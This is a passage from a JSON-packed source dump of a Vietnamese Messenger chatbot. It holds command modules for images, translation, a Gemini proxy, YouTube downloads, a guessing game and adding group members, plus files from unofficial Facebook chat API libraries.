\"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const girl = require('./../../img/rem.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: 'Rem nh√† ai ƒë√¢y',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1602,"size_tokens":null},"lib/fca-auto/src/getThreadPictures.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getThreadPictures(threadID, offset, limit, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      thread_id: threadID,\n      offset: offset,\n      limit: limit\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/messaging/attachments/sharedphotos.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        return Promise.all(\n          resData.payload.imagesData.map(function (image) {\n            form = {\n              thread_id: threadID,\n              image_id: image.fbid\n            };\n            return defaultFuncs\n              .post(\"https://www.facebook.com/ajax/messaging/attachments/sharedphotos.php\", ctx.jar, form)\n              .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n              .then(function (resData) {\n                if (resData.error) throw resData;\n                // the response is pretty messy\n                var queryThreadID = resData.jsmods.require[0][3][1].query_metadata.query_path[0].message_thread;\n                var imageData = resData.jsmods.require[0][3][1].query_results[queryThreadID].message_images.edges[0].node.image2;\n                return imageData;\n              });\n          })\n        );\n      })\n      .then(resData => callback(null, resData))\n      .catch(function (err) {\n        log.error(\"Error in getThreadPictures\", err);\n        callback(err);\n      });\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1961,"size_tokens":null},"modules/commands/dich.js":{"content":"module.exports.config = {\nname: \"dich\",\nversion: \"1.0.1\",\nhasPermssion: 0,\ncredits: \"Mirai Team\",\nescription: \"d·ªãch\",\ncommandCategory: \"C√¥ng c·ª•\",\nusages: \"[D·ªãch t·∫•t c·∫£ ng√¥n ng·ªØ] [Text]\",\ncooldowns: 5,\ndependencies: {\n\"request\":¬† \"\"\n}\n};\n\nmodule.exports.run = async ({ api, event, args }) => {\nconst request = global.nodemodule[\"request\"];\nvar content = args.join(\" \");\nif (content.length == 0 && event.type != \"message_reply\") return global.utils.throwError(this.config.name, event.threadID,event.messageID);\nvar translateThis = content.slice(0, content.indexOf(\" ->\"));\nvar lang = content.substring(content.indexOf(\" -> \") + 4);\nif (event.type == \"message_reply\") {\ntranslateThis = event.messageReply.body\nif (content.indexOf(\"-> \") !== -1) lang = content.substring(content.indexOf(\"-> \") + 3);\nelse lang = global.config.language;\n}\nelse if (content.indexOf(\" -> \") == -1) {\ntranslateThis = content.slice(0, content.length)\nlang = global.config.language;\n}\nreturn request(encodeURI(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${lang}&dt=t&q=${translateThis}`), (err, response, body) => {\nif (err) return api.sendMessage(\"‚ö†Ô∏èƒêùôñÃÉ ùô®ùôñÃâùôÆ ùôßùôñ ùô°ùô§ÃÇÃÉùôû ùô´ùôöÃÇÃÄ ùô°ùôöÃ£ÃÇùô£ùôù ùô¢ùôñÃÄ ùôóùôñÃ£ùô£ ƒëùôñùô£ùôú ùô®ùô™ÃõÃâ ùôôùô™Ã£ùô£ùôú ùô´ùô™ùôû ùô°ùô§ÃÄùô£ùôú ùô®ùô™ÃõÃâ ùôôùô™Ã£ùô£ùôú ƒëùô§ùôñÃ£ùô£ ùô©ùôûùô£ ùô£ùôùùôñÃÜÃÅùô£ ùô†ùôùùôñÃÅùôò\", event.threadID, event.messageID);\nvar retrieve = JSON.parse(body);\nvar text = '';\nretrieve[0].forEach(item => (item[0]) ? text += item[0] : '');\nvar fromLang = (retrieve[2] === retrieve[8][0][0]) ? retrieve[2] : retrieve[8][0][0]\napi.sendMessage(`${text}`, event.threadID, event.messageID);\n});\n}","path":null,"size_bytes":1763,"size_tokens":null},"modules/commands/gemini.js":{"content":"const axios = require('axios');\nconst fs = require('fs');\nconst path = require('path');\n\nmodule.exports.config = {\n    name: \"gemini\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Chat v·ªõi AI Gemini\",\n    commandCategory: \"AI\",\n    usages: \"gemini n·ªôi dung\",\n    cooldowns: 10,\n};\n\nconst getApiUrl = () => {\n    try {\n        const filePath = path.join(__dirname, '/data/api.json');\n        const data = fs.readFileSync(filePath, 'utf-8');\n        const jsonData = JSON.parse(data);\n\n        if (!jsonData.gemini || jsonData.gemini.trim() === '') {\n            return null;\n        }\n        return jsonData.gemini;\n    } catch {\n        return null;\n    }\n};\n\nconst getChatResponse = async (text, api, event) => {\n    const apiUrl = getApiUrl();\n    if (!apiUrl) {\n        return api.sendMessage(\"ƒêang c·∫≠p nh·∫≠t!!!\", event.threadID, event.messageID);\n    }\n    try {\n        const response = await axios.get(`${apiUrl}?prompt=${encodeURIComponent(text)}`);\n        if (response.data && response.data.gemini) {\n            return response.data.gemini;\n        } else {}\n    } catch (error) {}\n}\n\nconst chatSessions = {};\n\nmodule.exports.run = async ({ api, event, args }) => {\n    try {\n        const text = args.join(' ');\n        if (!text) {\n            return api.sendMessage('Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ chat v·ªõi AI.', event.threadID, event.messageID);\n        }\n\n        const response = await getChatResponse(text, api, event);\n\n        const messageID = await new Promise((resolve, reject) => {\n            api.sendMessage(response, event.threadID, (error, info) => {\n                if (error) {\n                    reject(error);\n                } else {\n                    resolve(info.messageID);\n                }\n            }, event.messageID);\n        });\n\n        chatSessions[messageID] = event.threadID;\n    } catch (error) {}\n};\n\n\nmodule.exports.handleReply = async ({ api, event }) => {\n    try {\n        const sessionThreadID = chatSessions[event.messageReply.messageID];\n\n        if (sessionThreadID && sessionThreadID === event.threadID) {\n            const text = event.body;\n            const response = await getChatResponse(text);\n\n            const messageID = await new Promise((resolve, reject) => {\n                api.sendMessage(response, event.threadID, (error, info) => {\n                    if (error) {\n                        reject(error);\n                    } else {\n                        resolve(info.messageID);\n                    }\n                }, event.messageID);\n            });\n\n            chatSessions[messageID] = event.threadID;\n            delete chatSessions[event.messageReply.messageID];\n        }\n    } catch (error) {}\n};\n\nmodule.exports.handleEvent = async function({ api, event }) {\n    if (event.type === \"message_reply\" && event.messageReply && chatSessions[event.messageReply.messageID]) {\n        await this.handleReply({ api, event });\n    }\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"description\": \"Chat v·ªõi AI Gemini th√¥ng qua API\"\n    }\n};\n","path":null,"size_bytes":3091,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/changeArchivedStatus.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function changeArchivedStatus(threadOrThreads, archive, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    var form = {};\n\n    if (utils.getType(threadOrThreads) === \"Array\") for (var i = 0; i < threadOrThreads.length; i++) form[\"ids[\" + threadOrThreads[i] + \"]\"] = archive;\n    else form[\"ids[\" + threadOrThreads + \"]\"] = archive;\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/change_archived_status.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"changeArchivedStatus\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1213,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/searchForThread.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function searchForThread(name, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var tmpForm = {\n      client: \"web_messenger\",\n      query: name,\n      offset: 0,\n      limit: 21,\n      index: \"fbid\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/search_threads.php\", ctx.jar, tmpForm)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        if (!resData.payload.mercury_payload.threads) return callback({ error: \"Could not find thread `\" + name + \"`.\" });\n        return callback(\n          null,\n          resData.payload.mercury_payload.threads.map(utils.formatThread)\n        );\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1171,"size_tokens":null},"modules/commands/getlink.js":{"content":"module.exports.config = {\n\tname: \"getlink\",\n\tversion: \"1.0.1\",\n\thasPermssion: 0,\n\tcredits: \"Mirai Team\",\n\tdescription: \"L·∫•y url download t·ª´ video, audio ƒë∆∞·ª£c g·ª≠i t·ª´ nh√≥m\",\n\tcommandCategory: \"C√¥ng c·ª•\",\n\tusages: \"\",\n\tcooldowns: 5,\n};\n\nmodule.exports.languages = {\n\t\"vi\": {\n\t\t\"invaidFormat\": \"‚ùå Tin nh·∫Øn b·∫°n ph·∫£n h·ªìi ph·∫£i l√† m·ªôt audio, video, ·∫£nh n√†o ƒë√≥\"\n\t},\n\t\"en\": {\n\t\t\"invaidFormat\": \"‚ùå Your need reply a message have contain an audio, video or picture\"\n\t}\n}\n\nmodule.exports.run = async ({ api, event, getText }) => {\n\tif (event.type !== \"message_reply\") return api.sendMessage(getText(\"invaidFormat\"), event.threadID, event.messageID);\n\tif (!event.messageReply.attachments || event.messageReply.attachments.length == 0) return api.sendMessage(getText(\"invaidFormat\"), event.threadID, event.messageID);\n\tif (event.messageReply.attachments.length > 1) return api.sendMessage(getText(\"invaidFormat\"), event.threadID, event.messageID);\n\treturn api.sendMessage(event.messageReply.attachments[0].url, event.threadID, event.messageID);\n}","path":null,"size_bytes":1068,"size_tokens":null},"modules/commands/atdytb.js":{"content":"const axios = require(\"axios\");\nconst fs = require(\"fs\");\n\nconst isURL = (u) => /^http(|s):\\/\\//.test(u);\n\nexports.handleEvent = async function (o) {\n  try {\n    const str = o.event.body;\n    const send = (msg) =>\n      o.api.sendMessage(msg, o.event.threadID, o.event.messageID);\n    const head = (app) =>\n      `==„Äé ùêÄùêÆùê≠ùê®ùêùùê®ùê∞ùêß ùêòùê®ùêÆùê≠ùêÆùêõùêû „Äè==\\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ`;\n\n    if (isURL(str) && /(^https:\\/\\/)((www)\\.)?(youtube|youtu)(PP)*\\.(com|be)\\//.test(str)) {\n      let ytdl = require('@distube/ytdl-core');\n\n      ytdl.getInfo(str).then(async info => {\n        let detail = info.videoDetails;\n        let format = info.formats.find(f => f.qualityLabel && f.qualityLabel.includes('360p') && f.audioBitrate);\n        if (format) {\n          send({\n            body: `${head('YOUTUBE')}\\n- Ti√™u ƒê·ªÅ: ${detail.title}`,\n            attachment: await streamURL(format.url, 'mp4')\n          });\n        } else {\n          console.error(error);\n        }\n      });\n    }\n  } catch(e) {\n    console.log('Error', e);\n  }\n};\n\nexports.run = () => {};\n\nexports.config = {\n  name: 'atdytb',\n  version: '1',\n  hasPermssion: 0,\n  credits: 'TatsuYTB',\n  description: '',\n  commandCategory: 'Ti·ªán √≠ch',\n  usages: [],\n  cooldowns: 3\n};\n\nfunction streamURL(url, type) {\n  return axios.get(url, {\n    responseType: 'arraybuffer'\n  }).then(res => {\n    const path = __dirname + `/cache/${Date.now()}.${type}`;\n    fs.writeFileSync(path, res.data);\n    setTimeout(p => fs.unlinkSync(p), 1000 * 60, path);\n    return fs.createReadStream(path);\n  });\n}\n","path":null,"size_bytes":1609,"size_tokens":null},"modules/commands/doanso.js":{"content":"const moment = require('moment-timezone');\n\nmodule.exports.config = {\n    name: \"doanso\",\n    version: \"1.0.0\",\n    hasPermission: 0,\n    credits: \"TatsuYTB\",\n    description: \"Tr√≤ ch∆°i ƒëo√°n s·ªë\",\n    commandCategory: \"Tr√≤ Ch∆°i\",\n    usages: \"\",\n    cooldowns: 5\n};\n\nconst levels = [\n    { level: 1, max: 20, reward: 1000 },\n    { level: 2, max: 50, reward: 2000 },\n    { level: 3, max: 100, reward: 3000 },\n    { level: 4, max: 500, reward: 5000 },\n    { level: 5, max: 1000, reward: 10000 }\n];\n\nconst maxGuesses = 10;\n\nmodule.exports.run = async ({ api, event, args }) => {\n    const threadID = event.threadID;\n    const senderID = event.senderID;\n    const level = parseInt(args[0], 10);\n\n    if (isNaN(level) || level < 1 || level > 5) {\n        return api.sendMessage('ùêïùêÆùê¢ ùê•ùê®ÃÄùêßùê† ùêúùê°ùê®Ã£ÃÇùêß ùêúùêöÃÇÃÅùê© ùêùùê®Ã£ÃÇ ùê≠ùêÆÃõÃÄ ùüè ùêùùêûÃÇÃÅùêß ùüì.', threadID);\n    }\n\n    const selectedLevel = levels.find(l => l.level === level);\n    const targetNumber = Math.floor(Math.random() * selectedLevel.max) + 1;\n    const startMsg = `\nùêìùê´ùê®ÃÄ ùêúùê°ùê®Ãõùê¢ ùêùùê®ùêöÃÅùêß ùê¨ùê®ÃÇÃÅ ùêõùêöÃÜÃÅùê≠ ùêùùêöÃÇÃÄùêÆ!\nùêÅùê®ùê≠ ùêùùêöÃÉ ùêúùê°ùê®Ã£ùêß ùê¶ùê®Ã£ÃÇùê≠ ùê¨ùê®ÃÇÃÅ ùê≠ùê´ùê®ùêßùê† ùê§ùê°ùê®ùêöÃâùêßùê† ùê≠ùêÆÃõÃÄ 1 ùêùùêûÃÇÃÅùêß ${selectedLevel.max}.\nùêÅùêöÃ£ùêß ùêúùê®ÃÅ ${maxGuesses} ùê•ùêöÃÇÃÄùêß ùêùùê®ùêöÃÅùêß. ùêáùêöÃÉùê≤ ùêúùê®ÃÇÃÅ ùê†ùêöÃÜÃÅùêßùê† ùêùùê®ùêöÃÅùêß ùê±ùêûùê¶ ùêùùê®ÃÅ ùê•ùêöÃÄ ùê¨ùê®ÃÇÃÅ ùêßùêöÃÄùê®.\nùêÇùêöÃÇÃÅùê© ùêùùê®Ã£ÃÇ: ${level} (ùê≠ùê°ùêÆÃõùê®ÃõÃâùêßùê†: ${selectedLevel.reward} ùê≠ùê¢ùêûÃÇÃÄùêß)\nùêëùêûùê©ùê•ùê≤ ùê≠ùê¢ùêß ùêßùê°ùêöÃÜÃÅùêß ùêßùêöÃÄùê≤ ùêùùêûÃÇÃâ ùêùùê®ùêöÃÅùêß!\n    `.trim();\n\n    api.sendMessage(startMsg, threadID, (err, info) => {\n        global.client.handleReply.push({\n            type: 'guessnumber',\n            name: module.exports.config.name,\n            targetNumber,\n            threadID,\n            senderID,\n            messageID: info.messageID,\n            level,\n            guesses: 0 \n        });\n    });\n};\n\nmodule.exports.handleReply = async ({ api, event, handleReply, Currencies }) => {\n    if (handleReply.type === 'guessnumber') {\n        const { targetNumber, threadID, senderID, messageID, level } = handleReply;\n        let { guesses } = handleReply;\n\n        if (event.senderID !== senderID || event.threadID !== threadID) return;\n\n        const guess = parseInt(event.body, 10);\n\n        if (isNaN(guess)) {\n            return api.sendMessage('ùêïùêÆùê¢ ùê•ùê®ÃÄùêßùê† ùêßùê°ùêöÃ£ÃÇùê© ùê¶ùê®Ã£ÃÇùê≠ ùê¨ùê®ÃÇÃÅ ùê°ùê®ÃõÃ£ùê© ùê•ùêûÃ£ÃÇ.', threadID);\n        }\n\n        guesses++;\n\n        handleReply.guesses = guesses;\n\n        if (guess < targetNumber) {\n            api.sendMessage(`ùêíùê®ÃÇÃÅ ùêõùêöÃ£ùêß ùêùùê®ùêöÃÅùêß ùêßùê°ùê®Ãâ ùê°ùê®Ãõùêß ùê¨ùê®ÃÇÃÅ ùê¶ùêÆÃ£ùêú ùê≠ùê¢ùêûÃÇùêÆ. (${guesses}/${maxGuesses} ùê•ùêöÃÇÃÄùêß ùêùùê®ùêöÃÅùêß)`, threadID, messageID);\n        } else if (guess > targetNumber) {\n            api.sendMessage(`ùêíùê®ÃÇÃÅ ùêõùêöÃ£ùêß ùêùùê®ùêöÃÅùêß ùê•ùê®ÃõÃÅùêß ùê°ùê®Ãõùêß ùê¨ùê®ÃÇÃÅ ùê¶ùêÆÃ£ùêú ùê≠ùê¢ùêûÃÇùêÆ. (${guesses}/${maxGuesses} ùê•ùêöÃÇÃÄùêß ùêùùê®ùêöÃÅùêß)`, threadID, messageID);\n        } else {\n            await Currencies.increaseMoney(senderID, levels[level - 1].reward);\n            api.sendMessage(`ùêÇùê°ùêÆÃÅùêú ùê¶ùêÆÃõÃÄùêßùê†! ùêÅùêöÃ£ùêß ùêùùêöÃÉ ùêùùê®ùêöÃÅùêß ùêùùêÆÃÅùêßùê† ùê¨ùê®ÃÇÃÅ ${targetNumber}!\\nùêÅùêöÃ£ùêß ùêùùêÆÃõùê®ÃõÃ£ùêú ùê≠ùê°ùêÆÃõùê®ÃõÃâùêßùê† ${levels[level - 1].reward} ùê≠ùê¢ùêûÃÇÃÄùêß.`, threadID);\n            return global.client.handleReply = global.client.handleReply.filter(item => item.messageID !== messageID);\n        }\n\n        if (guesses >= maxGuesses) {\n            setTimeout(() => {\n                api.sendMessage(`ùêÅùêöÃ£ùêß ùêùùêöÃÉ ùê°ùêûÃÇÃÅùê≠ ùê•ùêÆÃõùê®ÃõÃ£ùê≠ ùêùùê®ùêöÃÅùêß. ùêíùê®ÃÇÃÅ ùêùùêÆÃÅùêßùê† ùê•ùêöÃÄ ${targetNumber}.`, threadID);\n            }, 500);\n            return global.client.handleReply = global.client.handleReply.filter(item => item.messageID !== messageID);\n        }\n\n        const index = global.client.handleReply.findIndex(item => item.messageID === messageID);\n        if (index !== -1) {\n            global.client.handleReply[index] = handleReply;\n        }\n    }\n};\n","path":null,"size_bytes":4508,"size_tokens":null},"modules/commands/adduser.js":{"content":"module.exports.config = {\n    name: \"adduser\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"D-Jukie\",\n    description: \"Th√™m ng∆∞·ªùi d√πng v√†o nh√≥m b·∫±ng link ho·∫∑c uid\",\n    commandCategory: \"Qu·∫£n L√≠ Box\",\n    usages: \"[args]\",\n    cooldowns: 5\n};\nmodule.exports.run = async function ({ api, event, args, Threads, Users }) {\nconst { threadID, messageID } = event;\nconst axios = require('axios')\nconst link = args.join(\" \")\nif(!args[0]) return api.sendMessage({body:`‚û©ùêöùêùùêùùêÆùê¨ùêûùê´ + ùê•ùê¢ùêßùê§ ùêüùêõ\\n‚û©ùêöùêùùêùùêÆùê¨ùêûùê´ + ùêÆùê¢ùêù\\n‚û©ùêïùêÉ: ùêöùêùùêùùêÆùê¨ùêûùê´ + ùêÆùê¢ùêù ùê°ùê®ùêöÃ£ÃÜùêú ùê•ùê¢ùêßùê§`\n},event.threadID, event.messageID)\nvar { participantIDs, approvalMode, adminIDs } = await api.getThreadInfo(threadID);\nif(link.indexOf(\".com/\")!==-1) {\n    const res = await api.getUID(args[0] || event.messageReply.body);\n    var uidUser = res\n    api.addUserToGroup(uidUser, threadID, (err) => {\n    if (participantIDs.includes(uidUser)) return api.sendMessage('ùêìùê°ùêöÃÄùêßùê° ùêØùê¢ùêûÃÇùêß ƒëùêöÃÉ ùêúùê®ÃÅ ùê¶ùêöÃ£ÃÜùê≠ ùê≠ùê´ùê®ùêßùê† ùêßùê°ùê®ÃÅùê¶', threadID, messageID);\n    if (err) return api.sendMessage(`ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê≠ùê°ùêûÃÇùê¶ ùê≠ùê°ùêöÃÄùêßùê° ùêØùê¢ùêûÃÇùêß ùêØùêöÃÄùê® ùêßùê°ùê®ÃÅùê¶`, threadID, messageID);\n    else if (approvalMode && !adminIDs.some(item => item.id == api.getCurrentUserID())) return api.sendMessage(`ƒêùêöÃÉ ùê≠ùê°ùêûÃÇùê¶ ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢ ùêùùêÆÃÄùêßùê† ùêØùêöÃÄùê® ùêùùêöùêßùê° ùê¨ùêöÃÅùêúùê° ùê©ùê°ùêûÃÇ ùêùùêÆùê≤ùêûÃ£ÃÇùê≠`, threadID, messageID);\n    else return api.sendMessage(`ùêìùê°ùêûÃÇùê¶ ùê≠ùê°ùêöÃÄùêßùê° ùêØùê¢ùêûÃÇùêß ùêØùêöÃÄùê® ùêßùê°ùê®ÃÅùê¶ ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê†`, threadID, messageID);\n    });\n    }\n  else { \n    var uidUser = args[0] \n    api.addUserToGroup(uidUser, threadID, (err) => {\n    if (participantIDs.includes(uidUser)) return api.sendMessage(`ùêìùê°ùêöÃÄùêßùê° ùêØùê¢ùêûÃÇùêß ƒëùêöÃÉ ùêúùê®ÃÅ ùê¶ùêöÃ£ÃÜùê≠ ùê≠ùê´ùê®ùêßùê† ùêßùê°ùê®ÃÅùê¶`, threadID, messageID);\n    if (err) return api.sendMessage(`ùêäùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùê≠ùê°ùêûÃÇùê¶ ùê≠ùê°ùêöÃÄùêßùê° ùêØùê¢ùêûÃÇùêß ùêØùêöÃÄùê® ùêßùê°ùê®ÃÅùê¶`, threadID, messageID);\n    else if (approvalMode && !adminIDs.some(item => item.id == api.getCurrentUserID())) return api.sendMessage(`ƒêùêöÃÉ ùê≠ùê°ùêûÃÇùê¶ ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢ ùêùùêÆÃÄùêßùê† ùêØùêöÃÄùê® ùêùùêöùêßùê° ùê¨ùêöÃÅùêúùê° ùê©ùê°ùêûÃÇ ùêùùêÆùê≤ùêûÃ£ÃÇùê≠`, threadID, messageID);\n    else return api.sendMessage(`ùêìùê°ùêûÃÇùê¶ ùê≠ùê°ùêöÃÄùêßùê° ùêØùê¢ùêûÃÇùêß ùêØùêöÃÄùê® ùêßùê°ùê®ÃÅùê¶ ùê≠ùê°ùêöÃÄùêßùê° ùêúùê®ÃÇùêßùê†`, threadID, messageID);\n    });\n  }\n}","path":null,"size_bytes":2907,"size_tokens":null},"lib/fca-auto/src/listenMqtt.js":{"content":"/* eslint-disable linebreak-style */\n'use strict';\n\nconst utils = require('../utils');\nconst log = require('npmlog');\nconst mqtt = require('mqtt');\nconst WebSocket = require('ws');\nconst HttpsProxyAgent = require('https-proxy-agent');\nconst EventEmitter = require('events');\nconst Duplexify = require('duplexify');\nconst { Transform } = require('stream');\n\nvar identity = function() {};\nvar form = {};\nvar getSeqID = function() {};\nglobal.Fca.Data.MsgCount = new Map();\nglobal.Fca.Data.event = new Map();\n\nconst topics = ['/ls_req', '/ls_resp', '/legacy_web', '/webrtc', '/rtc_multi', '/onevc', '/br_sr', '/sr_res', '/t_ms', '/thread_typing', '/orca_typing_notifications', '/notify_disconnect', '/orca_presence', '/inbox', '/mercury', '/messaging_events', '/orca_message_notifications', '/pp', '/webrtc_response'];\n\nlet WebSocket_Global;\nlet mqttReconnectCount = 0;\nconst maxReconnectAttempts = 5;\nconst reconnectBackoff = 2000;\n\nfunction buildProxy() {\n    const Proxy = new Transform({\n        objectMode: false,\n        transform(chunk, enc, next) {\n            if (WebSocket_Global.readyState !== WebSocket_Global.OPEN) {\n                return next();\n            }\n\n            let data;\n            if (typeof chunk === 'string') {\n                data = Buffer.from(chunk, 'utf8');\n            } else {\n                data = chunk;\n            }\n\n            WebSocket_Global.send(data);\n            next();\n        },\n        flush(done) {\n            WebSocket_Global.close();\n            done();\n        },\n        writev(chunks, cb) {\n            const buffers = chunks.map(({ chunk }) => {\n                if (typeof chunk === 'string') {\n                    return Buffer.from(chunk, 'utf8');\n                }\n                return chunk;\n            });\n            this._write(Buffer.concat(buffers), 'binary', cb);\n        },\n    });\n    return Proxy;\n}\n\nfunction buildStream(options, WebSocket, Proxy) {\n    const Stream = Duplexify(undefined, undefined, options);\n    Stream.socket = WebSocket;\n\n    let pingInterval;\n    let reconnectTimeout;\n\n    const clearTimers = () => {\n        clearInterval(pingInterval);\n        clearTimeout(reconnectTimeout); \n    };\n\n    WebSocket.onclose = () => {\n        clearTimers();\n        Stream.end();\n        Stream.destroy();\n    };\n\n    WebSocket.onerror = (err) => {\n        console.log('Error: WebSocket.onerror', err); // Th√™m d√≤ng n√†y\n        clearTimers();\n        Stream.destroy(err);\n    };\n\n    WebSocket.onmessage = (event) => {\n        clearTimeout(reconnectTimeout);\n        const data = event.data instanceof ArrayBuffer ? Buffer.from(event.data) : Buffer.from(event.data, 'utf8');\n        Stream.push(data);\n    };\n\n    WebSocket.onopen = () => {\n        Stream.setReadable(Proxy);\n        Stream.setWritable(Proxy);\n        Stream.emit('connect');\n\n        // Ping m·ªói 30s ƒë·ªÉ gi·ªØ k·∫øt n·ªëi\n        pingInterval = setInterval(() => {\n            if (WebSocket.readyState === WebSocket.OPEN) {\n                WebSocket.ping();\n            }\n        }, 30000);\n\n        // Timeout 60s n·∫øu kh√¥ng nh·∫≠n ƒë∆∞·ª£c response \n        reconnectTimeout = setTimeout(() => {\n            if (WebSocket.readyState === WebSocket.OPEN) {\n                WebSocket.close();\n                Stream.end();\n                Stream.destroy();\n            }\n        }, 60000);\n    };\n\n    WebSocket_Global = WebSocket;\n    Proxy.on('close', () => {\n        clearTimers();\n        WebSocket.close();\n    });\n\n    return Stream;\n}\nfunction listenMqtt(defaultFuncs, api, ctx, globalCallback) {\n    const chatOn = ctx.globalOptions.online;\n    const foreground = false;\n\n    const sessionID = Math.floor(Math.random() * Number.MAX_SAFE_INTEGER) + 1;\n    const GUID = utils.getGUID()\n    const username = {\n        u: ctx.userID,\n        s: sessionID,\n        chat_on: chatOn,\n        fg: foreground,\n        d: GUID,\n        ct: 'websocket',\n        aid: '219994525426954',\n        aids: null,\n        mqtt_sid: '',\n        cp: 3,\n        ecp: 10,\n        st: [],\n        pm: [],\n        dc: '',\n        no_auto_fg: true,\n        gas: null,\n        pack: [],\n        p: null,\n        php_override: \"\"\n    };\n\n    const cookies = ctx.jar.getCookies('https://www.facebook.com').join('; ');\n\n    let host;\n    if (ctx.mqttEndpoint) {\n        host = `${ctx.mqttEndpoint}&sid=${sessionID}&cid=${GUID}`;\n    } else if (ctx.region) {\n        host = `wss://edge-chat.facebook.com/chat?region=${ctx.region.toLowerCase()}&sid=${sessionID}&cid=${GUID}`;\n    } else {\n        host = `wss://edge-chat.facebook.com/chat?sid=${sessionID}&cid=${GUID}`;\n    }\n\n    const options = {\n        clientId: 'mqttwsclient',\n        protocolId: 'MQIsdp',\n        protocolVersion: 3,\n        username: JSON.stringify(username),\n        clean: true,\n        wsOptions: {\n            headers: {\n                Cookie: cookies,\n                Origin: 'https://www.facebook.com',\n                'User-Agent': ctx.globalOptions.userAgent || 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',\n                Referer: 'https://www.facebook.com/',\n                Host: new URL(host).hostname,\n            },\n            origin: 'https://www.facebook.com',\n            protocolVersion: 13,\n            binaryType: 'arraybuffer',\n        },\n        keepalive: 60,\n        reschedulePings: true,\n        reconnectPeriod: 2000,\n        connectTimeout: 10000,\n    };\n\n    if (ctx.globalOptions.proxy !== undefined) {\n        const agent = new HttpsProxyAgent(ctx.globalOptions.proxy);\n        options.wsOptions.agent = agent;\n    }\n\n    ctx.mqttClient = new mqtt.Client(() => buildStream(options, new WebSocket(host, options.wsOptions), buildProxy()), options);\n    global.mqttClient = ctx.mqttClient;\n\n    global.mqttClient.on('error', (err) => {\n        console.log('Error: mqttClient.on(error)', err); // Th√™m d√≤ng n√†y\n        log.error('listenMqtt', err);\n        